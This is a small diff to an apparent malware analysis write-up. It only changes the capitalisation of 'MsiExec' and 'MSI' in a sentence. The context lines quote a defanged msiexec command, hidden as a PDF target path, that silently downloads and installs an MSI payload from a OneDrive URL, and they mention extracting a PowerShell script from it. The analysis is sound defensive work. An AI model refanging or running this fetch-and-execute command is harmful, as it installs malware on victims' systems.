@@ -13,7 +13,7 @@ PDF Target Path (Defanged):
 C:\Windows\System32\msiexec.exe -package hxxPs[:/\]onedrive.live[.]com/download?cid=85B4181C5D4F7514&resid=58504D327740F380%21149&authkey=AIHrvoeE31NvUiI&.msi -qn
 ```
 
-Upon execution, msiexec would execute with the argument to download and execute a msi file from the OneDrive URL provided.
+Upon execution, MsiExec would execute with the argument to download and execute a MSI file from the OneDrive URL provided.
 
 This downloaded a file called "42WiseAnyConnect.msi", which we can extract a PowerShell script from using lessmsi:
 
